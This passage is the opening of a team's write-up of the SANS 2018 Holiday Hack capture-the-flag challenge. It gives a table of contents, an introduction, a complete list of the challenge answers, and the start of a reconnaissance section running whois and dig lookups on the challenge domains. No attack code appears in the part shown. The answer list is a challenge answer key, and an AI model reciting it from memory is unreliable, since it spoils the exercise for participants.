<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SANS 2018 Holiday Hack Writeup</title>
<meta name="generator" content="Org mode" />
<meta name="author" content="ESnet Security Team" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
  /*]]>*/-->
</style>
<link rel="shortcut icon" type="image/png" href="favicon.ico"/>
<link rel="stylesheet" type="text/css" href="css/htmlize.css"/>
<link rel="stylesheet" type="text/css" href="css/readtheorg.css"/>
<link rel="stylesheet" type="text/css" href="css/asciinema-player.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/jquery.stickytableheaders.min.js"></script>
<script type="text/javascript" src="js/readtheorg.js"></script>
<script type="text/javascript" src="js/asciinema-player.js"></script>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<style>#content{max-width:1200px;}</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2018 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        displayAlign: "center",
        displayIndent: "0em",

        "HTML-CSS": { scale: 100,
                        linebreaks: { automatic: "false" },
                        webFont: "TeX"
                       },
        SVG: {scale: 100,
              linebreaks: { automatic: "false" },
              font: "TeX"},
        NativeMML: {scale: 100},
        TeX: { equationNumbers: {autoNumber: "AMS"},
               MultLineWidth: "85%",
               TagSide: "right",
               TagIndent: ".8em"
             }
});
</script>
<script type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
</head>
<body>
<div id="content">
<h1 class="title">SANS 2018 Holiday Hack Writeup</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#intro">Introduction</a></li>
<li><a href="#answers">Answers</a></li>
<li><a href="#recon">Reconnaisance</a>
<ul>
<li><a href="#orgf645262">Goal</a></li>
<li><a href="#org58f7f15">Reverse Whois</a></li>
<li><a href="#orgdc7e6a8">Domain Name System (DNS)</a></li>
<li><a href="#org2e40f41">Certificate Transparency Logs</a></li>
<li><a href="#org13b860c">Monitoring</a></li>
<li><a href="#orge3f4965">Summary</a></li>
</ul>
</li>
<li><a href="#linecon">LineCon</a>
<ul>
<li><a href="#org37bffb9">Goal</a></li>
<li><a href="#orgfe41fb4">Finding a hidden path</a></li>
<li><a href="#org4200f7c">Client-side tricks to make secrets stand out</a></li>
<li><a href="#org45078e7">Game Internals: WebSocket Messages</a></li>
<li><a href="#org2a2fb76">Game Internals: Avatar DNA</a></li>
<li><a href="#orgf8d2422">First Finding: Avatar vulnerability</a></li>
<li><a href="#org6a96770">Summary</a></li>
</ul>
</li>
<li><a href="#kringlecon">KringleCon</a>
<ul>
<li><a href="#orgf7285b5">Map</a></li>
<li><a href="#orga0e56ae">Story</a></li>
<li><a href="#org96fc903">Bonus: Crawling through the Vents</a>
<ul>
<li><a href="#org2dd7c16">Solution 1: Manually Crafted Vent Maze</a></li>
<li><a href="#org01b296a">Solution 2: Recover Map from Git Repository</a></li>
<li><a href="#maze_solver">Solution 3: Automated Maze Solver</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orga595fe3">Cranberry Pi Terminals</a>
<ul>
<li><a href="#terminal_overview">Overview</a></li>
<li><a href="#org5a1c11c">Essential Editor</a>
<ul>
<li><a href="#org6a7812e">Goal</a></li>
<li><a href="#orgb429dd9">Background</a></li>
<li><a href="#orgb4a1c2d">Intro</a></li>
<li><a href="#orgfed464f">Solution</a></li>
<li><a href="#org930ee0e">Game Internals: How it was made</a></li>
<li><a href="#org57d2cbd">Summary</a></li>
</ul>
</li>
<li><a href="#pwshmenu">Powershell Name Game</a>
<ul>
<li><a href="#orge3ae2fb">Goal</a></li>
<li><a href="#orgfa0c92d">Background</a></li>
<li><a href="#org19d3cb4">Intro</a></li>
<li><a href="#org3644231">Solution</a></li>
<li><a href="#org09b6c6c">Summary</a></li>
</ul>
</li>
<li><a href="#viminfo">Vim ForensicELFification</a>
<ul>
<li><a href="#org2edefe5">Goal</a></li>
<li><a href="#org9d34555">Background</a></li>
<li><a href="#org8924668">Intro</a></li>
<li><a href="#orgd226ba9">Solution</a></li>
<li><a href="#orgd8b4999">Summary</a></li>
</ul>
</li>
<li><a href="#plaintext-creds">Samba Mucking Report</a>
<ul>
<li><a href="#orgd90f1ef">Goal</a></li>
<li><a href="#orgff1ce22">Background</a></li>
<li><a href="#orgdda3d3d">Intro</a></li>
<li><a href="#orgd21a8f6">Solution</a></li>
<li><a href="#orgec7ee6b">Summary</a></li>
</ul>
</li>
<li><a href="#http2">HTTP2 CURLing Master</a>
<ul>
<li><a href="#org479ffe7">Goal</a></li>
<li><a href="#org6ff0dab">Background</a></li>
<li><a href="#orga38c38c">Intro</a></li>
<li><a href="#org8dfe592">Solution</a></li>
<li><a href="#orgddc6252">Alternative solution</a></li>
<li><a href="#orgde1e300">Summary</a></li>
</ul>
</li>
<li><a href="#spray-detect">Windows Yule Log Analysis</a>
<ul>
<li><a href="#orgf385e11">Goal</a></li>
<li><a href="#orgfb13e48">Background</a></li>
<li><a href="#org166bac7">Intro</a></li>
<li><a href="#orgd68bc73">Solution</a></li>
<li><a href="#org56cb83f">Summary</a></li>
</ul>
</li>
<li><a href="#gitpasshist">Git Dev Ops Fail</a>
<ul>
<li><a href="#org39b703b">Goal</a></li>
<li><a href="#org61632c9">Background</a></li>
<li><a href="#org3dec670">Intro</a></li>
<li><a href="#orgdccad23">Solution</a></li>
<li><a href="#org2bec37d">Summary</a></li>
</ul>
</li>
<li><a href="#python_docker_challenge">Python Escape from LA</a>
<ul>
<li><a href="#org27ba393">Goal</a></li>
<li><a href="#org5e483e4">Background</a></li>
<li><a href="#org2086b4e">Intro</a></li>
<li><a href="#org41b8e8b">Solution</a></li>
<li><a href="#orgdd6f95d">Summary</a></li>
</ul>
</li>
<li><a href="#unlinked-function">The GDB Sleighbell Lottery</a>
<ul>
<li><a href="#org91e2009">Goal</a></li>
<li><a href="#org4923523">Background</a></li>
<li><a href="#org491f625">Intro</a></li>
<li><a href="#org1c20fbc">Solution</a></li>
<li><a href="#org2ab6949">Summary</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#org11d8f80">Objectives</a>
<ul>
<li><a href="#obj1">Orientation Challenge</a>
<ul>
<li><a href="#orgd9bfccd">Goal</a></li>
<li><a href="#orgc41fac9">Background</a></li>
<li><a href="#orgc698f58">Solution</a></li>
</ul>
</li>
<li><a href="#obj2">Directory Browsing</a>
<ul>
<li><a href="#org3824d9c">Goal</a></li>
<li><a href="#org63a266a">Background</a></li>
<li><a href="#orgc99142e">Solution</a></li>
</ul>
</li>
<li><a href="#obj3">de Bruijn Sequences</a>
<ul>
<li><a href="#orgf1ca806">Goal</a></li>
<li><a href="#orgb3a4c6a">Background</a></li>
<li><a href="#orga7fb0e8">Solution</a></li>
</ul>
</li>
<li><a href="#obj4">Data Repo Analysis</a>
<ul>
<li><a href="#org9ee01a5">Goal</a></li>
<li><a href="#org4364557">Background</a></li>
<li><a href="#orgcea208b">Solution</a></li>
</ul>
</li>
<li><a href="#obj5">AD Privilege Discovery</a>
<ul>
<li><a href="#org9df0bc6">Goal</a></li>
<li><a href="#org1d18a71">Background</a></li>
<li><a href="#org66b19df">Solution</a></li>
</ul>
</li>
<li><a href="#obj6">Badge Manipulation</a>
<ul>
<li><a href="#orgab3893f">Goal</a></li>
<li><a href="#orga49cf76">Background</a></li>
<li><a href="#org94aa2f0">Solution</a></li>
</ul>
</li>
<li><a href="#obj7">Careers</a>
<ul>
<li><a href="#orgd880439">Goal</a></li>
<li><a href="#org2d1db58">Background</a></li>
<li><a href="#org9501c9e">Solution</a></li>
</ul>
</li>
<li><a href="#obj8">PCAPalyzer</a>
<ul>
<li><a href="#orgbbe0b54">Goal</a></li>
<li><a href="#org578bb85">Background</a></li>
<li><a href="#org99967ca">Solution Part 1: Downloading the SSL Key Logfile</a></li>
<li><a href="#org446c7dc">Solution Part 2: Decrypting the Traffic</a></li>
</ul>
</li>
<li><a href="#obj9">Ransomware Recovery</a>
<ul>
<li><a href="#orgf2d04e7">Goal</a></li>
<li><a href="#org1c55408">Background</a></li>
<li><a href="#obj91">Phase 1: Catch the Malware</a></li>
<li><a href="#obj92">Phase 2: Identify the Domain</a></li>
<li><a href="#obj93">Phase 3: Stop the Malware</a></li>
<li><a href="#obj94">Phase 4: Recover Alabaster's Password</a></li>
</ul>
</li>
<li><a href="#obj10">Who Is Behind It All?</a>
<ul>
<li><a href="#org098a037">Goal</a></li>
<li><a href="#orgd89eac2">Background</a></li>
<li><a href="#org7173c4f">Solution</a></li>
<li><a href="#bruijn_piano">de Bruijn Piano Lock?</a></li>
<li><a href="#rachmaninoff">Rachmaninoff?</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#escalations">Going Further: Escalations and 0days</a>
<ul>
<li><a href="#orge3c2104">Note</a></li>
<li><a href="#orge6ecaaa">Scan-O-Matic</a></li>
<li><a href="#orgc35f308">Popping a shell on careers</a></li>
</ul>
</li>
<li><a href="#teamwork">Working as a Team</a></li>
<li><a href="#eggs">Easter Eggs</a></li>
<li><a href="#orgf1de5bc">Thank Yous</a></li>
<li><a href="#appendix_reversing">Appendix 1: Reverse Engineering PyInstaller Binaries</a></li>
<li><a href="#appendix_hmac">Appendix 2: Game Internals: HMACs and Hidden Terminal Messages</a>
<ul>
<li><a href="#orgbc5ad0b">Recovering the HMAC keys</a></li>
<li><a href="#org42cd195">Challenge Keys</a></li>
</ul>
</li>
<li><a href="#appendix_tools">Appendix 3: Scripts and Tools</a>
<ul>
<li><a href="#org080f20d">Scan-O-Matic</a></li>
<li><a href="#orgb0b7070">Careers</a></li>
<li><a href="#orgc90009d">Malware</a></li>
<li><a href="#org991b51f">Maze Solver</a></li>
</ul>
</li>
<li><a href="#report">Postscript: Police Report</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgef0d6b1" class="outline-2">
<h2 id="intro"><a id="orgef0d6b1"></a>Introduction</h2>
<div class="outline-text-2" id="text-intro">
<p>
In the following write up of the Holiday Hack Challenge 2018, you’ll
find an enthralling take on a story we all know. Sure there is the
mystery of <a href="#kringlecon">Kringle Castle</a>, but there’s also the intrigue of <a href="#eggs">easter eggs</a>, 
the thrill of unknown <a href="#escalations">escalations</a>, and the allure of a
0day. You’ll also find an <a href="#maze_solver">automated vent map</a>, the truth behind
<a href="#rachmaninoff">Rachmaninoff</a>, and some <a href="#intro">easter eggs</a> of our own.
</p>

<p>
You’ll feel like you won a Golden Ticket with how easy it is to follow
along. The sections along the side expand in an everlasting way, not
unlike a Gobstopper, and what presents itself like a piece of gum;
small and easily chewed through, but actually fills you up like a
three course meal. We lay out the answers off the bat so you can chew
into the Wonka Bar-like sweetness right away.
</p>

<p>
We then move into the pre hack <a href="#recon">reconnaissance</a> we went through, as if
we were watching Nakatomi Plaza before attacking the hack. <a href="#linecon">Linecon</a> had
us waiting for our chance to arrive at the Holiday Party and make our
presence known. From there, we work our way through the story like
Samantha Coleman before we drop into the juicy part of the challenge.
</p>

<p>
You’ll see the <a href="#terminal_overview">Cranberry Pi Terminal challenges</a> come up next, with a
detailed overview. Each one will give the goal and any necessary
background needed to begin tackling it (including relevant
hints and videos). Feel free to skip right to the Solution (including asciinema
videos, that allow you to copy and paste) if you just want to know the
answer. If you feel like learning more, we’ll then step you through
our thought process in solving the problems, how the challenge was
made, and sometimes, an alternate solution. The Summary for each
challenge is also a good spot to skip to if you’re short on time as
you’ll get a nice, brief idea of what we did. The following <a href="#obj1">Objectives</a>
section works almost exactly the same, though leans more on pictures
than gifs.
</p>

<p>
After that is the really good stuff&#x2026; well, eventually. We're
withholding some findings as we wait for the relevant KringleCon
systems to be patched, and a CVE to be assigned. We will be releasing
the full <a href="#escalations">Going Further: Escalation and 0days</a> section in the next few
days.
</p>

<p>
We also thought it might be useful to show our entire process, how we
worked efficiently as a small <a href="#teamwork">team</a>, maybe our ideas will help
others. You might also have better ideas and can share your techniques
with us, we love to learn and improve!
</p>

<p>
Some artifacts will be left on our <a href="https://github.com/esnet/sans-holiday-hack-2018">Github</a> as they fit better there and
we don’t want to overwhelm you any more than required. See how many
easter eggs you can find between this site and the Github!
</p>

<p>
Happy reading,
</p>

<p>
<a href="http://es.net/about/esnet-staff/cybersecurity/">The ESnet Security Team</a>
</p>

<p>
&#x2013;Dop, Sam and Vlad
</p>
</div>
</div>
<div id="outline-container-org81359e5" class="outline-2">
<h2 id="answers"><a id="org81359e5"></a>Answers</h2>
<div class="outline-text-2" id="text-answers">
<ol class="org-ol">
<li><p>
What phrase is revealed when you answer all of the KringleCon Holiday Hack History questions?
</p>
<div class="tip">
<p>
<a href="#obj1">Happy Trails</a> (Die Hard Reference)
</p>

</div></li>
<li><p>
Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? 
</p>
<div class="tip">
<p>
<a href="#obj2">John McClane</a> (Die Hard Reference)
</p>

</div></li>
<li><p>
The KringleCon Speaker Unpreparedness room is protected by a
door passcode. Upon entering the correct passcode, what message
is presented to the speaker?
</p>
<div class="tip">
<p>
<a href="#obj3">Welcome UNprepared Speaker!</a>
</p>

</div></li>
<li><p>
Retrieve the encrypted ZIP file from the North Pole Git repository. What is the password to open this file?
</p>
<div class="tip">
<p>
<a href="#obj4">Yippee-ki-yay</a> (Die Hard Reference)
</p>

</div></li>
<li><p>
Using the data set contained in this SANS Slingshot Linux image,
find a reliable path from a Kerberoastable user to the Domain
Admins group. What’s the user’s logon name?
</p>
<div class="tip">
<p>
<a href="#obj5">LDUBEJ00320@AD.KRINGLECASTLE.COM</a>
</p>

</div></li>
<li><p>
What is the access control number revealed by the door authentication panel?
</p>
<div class="tip">
<p>
<a href="#obj6">19880715</a> (Die Hard Reference)
</p>

</div></li>
<li><p>
Which terrorist organization is secretly supported by the job applicant whose name begins with "K"?
</p>
<div class="tip">
<p>
<a href="#obj7">Fancy Beaver</a> (Fancy Bear reference)
</p>

</div></li>
<li><p>
What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?
</p>
<div class="tip">
<p>
<a href="#obj8">Mary Had a Little Lamb</a>
</p>

</div></li>
<li><p>
What is the success message displayed by the Snort terminal?
</p>
<div class="tip">
<p>
<a href="#obj91">Snort is alerting on all ransomware and only the ransomware!</a>
</p>

</div></li>
<li><p>
What is the domain name the malware in the document downloads from?
</p>
<div class="tip">
<p>
<a href="#obj92">erohetfanu.com</a> (Obfuscated Die Hard reference)
</p>

</div></li>
<li><p>
What is the full sentence text that appears on the domain registration success message (bottom sentence)?
</p>
<div class="tip">
<p>
<a href="#obj93">Successfully registered yippeekiyaa.aaay!</a> (Die Hard reference)
</p>

</div></li>
<li><p>
What is the password entered in the database for the Vault entry?
</p>
<div class="tip">
<p>
<a href="#obj94">ED#ED#EED#EF#G#F#G#ABA#BA#B</a> (Willy Wonka reference)
</p>

</div></li>
<li><p>
What message do you get when you unlock the door?
</p>
<div class="tip">
<p>
<a href="#obj10">You have unlocked Santa's vault!</a>
</p>

</div></li>
<li><p>
Who was the mastermind behind the whole KringleCon plan?
</p>
<div class="tip">
<p>
<a href="#report">Santa</a>
</p>

</div></li>
</ol>
</div>
</div>
<div id="outline-container-orgd53b63d" class="outline-2">
<h2 id="recon"><a id="orgd53b63d"></a>Reconnaisance</h2>
<div class="outline-text-2" id="text-recon">
<p>
Any penetration test starts with reconnaisance on your target.  In a
typical Capture the Flag (CTF) or other hacking challenge, you're
given all this information up-front. However, this step shouldn't be
skipped, as it can make the challenge easier.
</p>

<div id="text-table-of-contents">
<ul>
<li><a href="#orgf645262">Goal</a></li>
<li><a href="#org58f7f15">Reverse Whois</a></li>
<li><a href="#orgdc7e6a8">Domain Name System (DNS)</a></li>
<li><a href="#org2e40f41">Certificate Transparency Logs</a></li>
<li><a href="#org13b860c">Monitoring</a></li>
<li><a href="#orge3f4965">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgf645262" class="outline-3">
<h3 id="orgf645262">Goal</h3>
<div class="outline-text-3" id="text-orgf645262">
<div class="note">
<p>
Identify domain names, hostnames, IP addresses, etc.
</p>

</div>
</div>
</div>
<div id="outline-container-org58f7f15" class="outline-3">
<h3 id="org58f7f15">Reverse Whois</h3>
<div class="outline-text-3" id="text-org58f7f15">
<p>
First, we'll try to identify the domain names being used. Last year,
the domain was <span class="underline">northpolechristmastown.com</span>. Every domain name has
some ownership information associated with it. We can query this
information via a <code>whois</code> lookup:
</p>
<div class="org-src-container">
<pre class="src src-shell" id="org15d0c8c">$ whois northpolechristmastown.com
</pre>
</div>

<div class="org-src-container">
<pre class="src src-shell">...
Domain Name: northpolechristmastown.com
Registry Domain ID: 2176618950_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.godaddy.com
Registrar URL: http://www.godaddy.com
Updated Date: 2017-10-19T19:29:00Z
Creation Date: 2017-10-19T19:29:00Z
...
Registrant Organization: Counter Hack
...
</pre>
</div>

<p>
<span class="underline">northpolechristmastown.com</span> was registered in October 2017, and the
organization is listed as <i>Counter Hack</i>. Using this information, we
can also do a "reverse whois" search, where we can see all domains
that a given organization is listed as the registrant for:
</p>


<div class="figure">
<p><img src="./imgs/0_reverse_whois.png" alt="0_reverse_whois.png" />
</p>
<p><span class="figure-number">Figure 1: </span>A reverse whois search for <i>Counter Hack</i></p>
</div>


<p>
<span class="underline">kringlecon.com</span> was registered in May, and in July it was opened up for participants to begin signing up, and poking around (more on that below, in "LineCon").
</p>

<p>
<span class="underline">erohetfanu.com</span> and <span class="underline">kringlecastle.com</span> were registered in October. LineCon gave us a hint about the castle. erohetfanu.com seems obfuscated.
</p>
</div>
</div>
<div id="outline-container-orgdc7e6a8" class="outline-3">
<h3 id="orgdc7e6a8">Domain Name System (DNS)</h3>
<div class="outline-text-3" id="text-orgdc7e6a8">
<p>
Armed with the 3 domain names, we'll see what additional
information we can glean. <abbr title="The Domain Name Service"> DNS</abbr>
attempts to convert between hostnames and IP addresses.
</p>

<div class="org-src-container">
<pre class="src src-shell" id="orgb9ec9c0">dig +noall +answer ANY kringlecon.com
</pre>
</div>

<div class="org-src-container">
<pre class="src src-shell">kringlecon.com.         599     IN      A       104.196.14.143
kringlecon.com.         3599    IN      NS      ns45.domaincontrol.com.
kringlecon.com.         3599    IN      NS      ns46.domaincontrol.com.
kringlecon.com.         3599    IN      SOA     ns45.domaincontrol.com. dns.jomax.net. 2018121800 28800 7200 604800 600
kringlecon.com.         3599    IN      MX      10 aspmx.l.google.com.
kringlecon.com.         3599    IN      MX      20 alt1.aspmx.l.google.com.
kringlecon.com.         3599    IN      MX      30 alt2.aspmx.l.google.com.
kringlecon.com.         3599    IN      MX      40 aspmx2.googlemail.com.
kringlecon.com.         3599    IN      MX      50 aspmx3.googlemail.com.
kringlecon.com.         3599    IN      TXT     <span style="color: #8b2252;">"v=spf1 include:_spf.google.com ~all"</span>
</pre>
</div>

<p>
There's a lot of information returned, but we can learn that
<span class="underline">kringlecon.com</span> resolves to the IP address <span class="underline">104.196.14.143</span>, that DNS
services are provided by <span class="underline">domaincontrol.com</span>, and that e-mail services
are provided through Google Mail. These are "indicators," and can be
used to track how a certain actor likes to operate. Domains and IP
addresses can change, but tactics often stay the same.
</p>

<p>
Whois also works on IP addresses, so we can see the ownership of the IP address returned:
</p>

<div class="org-src-container">
<pre class="src src-shell" id="orgb78f218">whois 104.196.14.143
</pre>
</div>

<div class="org-src-container">
<pre class="src src-shell">...
NetRange:       104.196.0.0 - 104.199.255.255
CIDR:           104.196.0.0/14
NetName:        GOOGLE-CLOUD
...
</pre>
</div>

<p>
The IP address is owned by Google, and the name of the network implies
that it's part of Google's Cloud offerings. Some more digging reveals
that <span class="underline">northpolechristmastown.com</span> was set up the same way.
</p>

<p>
We can perform similar queries on the other two domains, and we find out the following information:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Domain</th>
<th scope="col" class="org-left">Purpose</th>
<th scope="col" class="org-left">Domain Registration Date</th>
<th scope="col" class="org-left">Domain Registry</th>
<th scope="col" class="org-left">DNS Provider</th>
<th scope="col" class="org-left">Mail Provider</th>
<th scope="col" class="org-left">IP Address</th>
<th scope="col" class="org-left">IP Owner</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">northpolechristmastown.com</td>
<td class="org-left">Last Year's Domain</td>
<td class="org-left">October 19th, 2017</td>
<td class="org-left">GoDaddy.com</td>
<td class="org-left">domaincontrol.com</td>
<td class="org-left">Google</td>
<td class="org-left">n/a</td>
<td class="org-left">Hosts hosted on Google Cloud</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">kringlecon.com</td>
<td class="org-left">The Kringle Conference</td>
<td class="org-left">May 25th, 2018</td>
<td class="org-left">GoDaddy.com</td>
<td class="org-left">domaincontrol.com</td>
<td class="org-left">Google</td>
<td class="org-left">104.196.14.143</td>
<td class="org-left">Google Cloud</td>
</tr>

<tr>
<td class="org-left">kringlecastle.com</td>
<td class="org-left">Unknown: Kringle's Castle?</td>
<td class="org-left">October 12th, 2018</td>
<td class="org-left">GoDaddy.com</td>
<td class="org-left">domaincontrol.com</td>
